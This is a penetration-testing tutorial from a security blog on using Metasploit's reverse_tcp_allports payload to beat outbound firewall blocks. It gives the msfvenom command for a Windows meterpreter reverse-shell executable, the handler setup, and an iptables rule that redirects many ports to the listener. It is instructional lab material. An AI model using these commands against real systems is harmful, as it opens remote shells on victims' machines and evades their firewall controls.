<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Bypass Firewall Restrictions with Metasploit (reverse_tcp_allports)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/bypass-firewall-restrictions-metasploit-reverse_tcp_allports/" rel="bookmark"><time class="entry-date published" datetime="2018-01-29T09:36:19+00:00">January 29, 2018</time><time class="updated" datetime="2025-05-12T21:17:43+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h2><span style="color: #000000;">Introduction</span></h2>
<p><span style="color: #000000;">Network Address Translation generally involves “re-writing the source and/or destination addresses of IP packets as they pass through a router or firewall” (from <a style="color: #000000;" href="http://en.wikipedia.org/wiki/Network_Address_Translation">http://en.wikipedia.org/wiki/Network_Address_Translation</a>)</span></p>
<p><span style="color: #000000;">The Linux kernel usually possesses a packet filter framework called <strong>netfilter</strong> (Project home: netfilter.org). This framework enables a Linux machine with an appropriate number of network cards (interfaces) to become a router capable of NAT. We will use the command utility ‘iptables’ to create complex rules for modification and filtering of packets. The important rules regarding NAT are – not very surprising – found in the ‘nat’-table. This table has three predefined chains: <strong>PREROUTING</strong>, <strong>OUTPUT</strong> und <strong>POSTROUTING</strong>.</span></p>
<p><span style="color: #000000;"><strong>ALL-PORTS payload:-</strong></span></p>
<p><span style="color: #000000;">‘reverse_tcp’ only allows connection to one port, but if the victim has blocked outgoing connections except a few ports. Then it makes it difficult for the attacker to set a port for listening. ‘reverse_tcp _allports’ is used to to brute-force all the ports from {1-65535}.</span></p>
<p><span style="color: #000000;">We use iptables to reroute any incoming connection to the listening port.</span></p>
<p><span style="color: #000000;">Let’s begin</span></p>
<p><span style="color: #000000;">We use metasploit to create a meterpreter reverse shell.</span></p>
<pre class="lang:default decode:true">msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=192.168.1.139 lport=4444 -f exe &gt; reverse_shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-0h90jrVmMxQ/Wm7nOYQZOfI/AAAAAAAATr4/SiQKIdAARgc2I-E_jshQHPjHRJByg0sFwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We now setup our listener using metasploit.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp_allports
msf exploit(multi/handler) &gt; set lhost 192.168.1.139
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-phhyUkszsss/Wm7nOyCcMyI/AAAAAAAATsA/rkWvr_P92FYZ6waYj2hWmviCZtFE4cGAACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Now we setup the firewall on our windows machine. We open firewall and select outbound connections.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--r81UobE4u0/Wm7nPemAhiI/AAAAAAAATsE/wQ8MAXthGQo8H62WDIm61C9Qzt3-f0xpQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We select ports to define the ports we need to block.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-k5gVT3_de1Y/Wm7nPjmyxCI/AAAAAAAATsM/1BVA0dz2Pe0XdDbuve-Toz9ca1WAS3APQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We select tcp to block tcp packets, and select port from 4444-5555.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-WJDL-1wna68/Wm7nPu4Oa-I/AAAAAAAATsI/_HO3QSK0VxMlW6RK-J_vrQPHn7qRpsXbgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now we select ‘Block the connection’ to block all the outgoing traffic packets from these ports.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CTKf1nEUl6c/Wm7nP9Rr_vI/AAAAAAAATsQ/ds9I3oxV-wUncXMJjXBj9J96bKIE23eMACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now we select the types of connection the firewall applies to.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZAwh9RgBjj4/Wm7nQM9dGCI/AAAAAAAATsU/mm3gh4h3UokL1WIA78s_K8EUsiDKuCmHwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We now name the firewall rule as “REVERSE_SHELL” and click finish to apply the rule.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Eyjj2g9bI30/Wm7nQI0tiQI/AAAAAAAATsY/Nr8HavWbliYqzz08-f2AYJs0Xt12iSjdQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now we define iptables to reroute all traffic coming to port 4444-5556 to port 4444. So that when the reverse shell tries to connect to our system on port 5556 it will be rerouted to port 4444.</span></p>
<pre class="lang:default decode:true  ">iptables -A PREROUTING -t nat -p tcp --dport  4444:5556 -j REDIRECT –to-port 4444</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-c-cS3SWEhc8/Wm7nQdYnbQI/AAAAAAAATsc/s8ZyyElmGg0Xt3_dHtuYuZ1_S27yPeAugCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">As soon as the victim runs the file we get our reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-c4mFi4LJ8Xg/Wm7nOnlvedI/AAAAAAAATr8/ImHwqRx7-oQwbREjd4-X_X2hrO-Lc0aLQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
